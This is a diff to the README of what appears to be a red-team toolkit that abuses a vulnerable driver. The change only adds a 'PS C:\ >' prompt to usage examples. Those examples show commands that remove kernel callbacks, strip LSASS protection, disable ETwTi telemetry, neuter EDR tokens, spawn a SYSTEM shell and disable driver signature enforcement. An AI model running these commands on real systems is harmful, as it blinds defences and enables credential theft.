@@ -49,7 +49,7 @@ Requirements:
 - Filenames can be configured in `config.h`
 
 ```powershell
-.\KernelCallbackRemover.exe
+PS C:\ > .\KernelCallbackRemover.exe
 Usage: KernelCallbackRemover.exe -l / -d
 Options:
   -l List Kernel Callbacks       - Lists all kernel callbacks through vulnerable driver
@@ -59,7 +59,7 @@ Options:
 
 #### Example removing kernel callbacks
 ```powershell
-.\KernelCallbackRemover.exe -d
+PS C:\ > .\KernelCallbackRemover.exe -d
 ```
 
 ## Protection Changer
@@ -73,7 +73,7 @@ Options:
 - Filenames and service names can be configured in `config.h`
 
 ```powershell
-.\ProtectionChanger.exe
+PS C:\ > .\ProtectionChanger.exe
 Usage: ProtectionChanger.exe -p <PID> -v <NEW PROTECTION LEVEL>
 Options:
   -p <pid>              Specify the process ID (PID) of the process to change the protection level.
@@ -97,7 +97,7 @@ Possible protection level values:
 - Example removing runasppl from LSASS process by setting the protection value to `0x00`
 
 ```powershell
-.\ProtectionChanger.exe -v 0x00 -p (Get-Process -Name lsass).id
+PS C:\ > .\ProtectionChanger.exe -v 0x00 -p (Get-Process -Name lsass).id
 ```
 
 ## ETwTi Remover
@@ -109,7 +109,7 @@ Possible protection level values:
 - Filenames can be configured in `config.h`
 
 ```powershell
-.\ETwTiRemover.exe
+PS C:\ > .\ETwTiRemover.exe
 Usage: ETwTiRemover.exe -e / -d
 Options:
   -e Enable ETwTi     - set ProviderEnableInfo field within the GUID entry to 0x1
@@ -120,7 +120,7 @@ Options:
 #### Example Disabling ETwTi
 
 ```powershell
-.\ETwTiRemover.exe -d
+PS C:\ > .\ETwTiRemover.exe -d
 ```
 
 ## Token Changer
@@ -133,7 +133,7 @@ Options:
 	- Unloads the RTCore64 driver and removes the file from `C:\Windows\System32\Drivers\RTCore64.sys
 
 ```
-.\TokenChanger.exe
+PS C:\ > .\TokenChanger.exe
 Usage: TokenChanger.exe --tp <PID> --sp <PID>
 Usage: TokenChanger.exe --edr
 Usage: TokenChanger.exe --edr --sp <PID>
@@ -148,13 +148,13 @@ Options:
 #### Example disabling EDR by downgrading token from explorer
 
 ```powershell
-.\TokenChanger.exe --edr --sp (Get-Process -Name explorer).id
+PS C:\ > .\TokenChanger.exe --edr --sp (Get-Process -Name explorer).id
 ```
 
 #### Example spawning system shell
 
 ```powershell
-.\TokenChanger.exe --spawnsystem
+PS C:\ > .\TokenChanger.exe --spawnsystem
 ```
 
 ## DSERemover
@@ -171,7 +171,7 @@ Options:
 - Filenames and service names can be configured in `config.h`
 
 ```powershell
-.\DSERemover.exe
+PS C:\ > .\DSERemover.exe
 ```
 
 # Cleanup
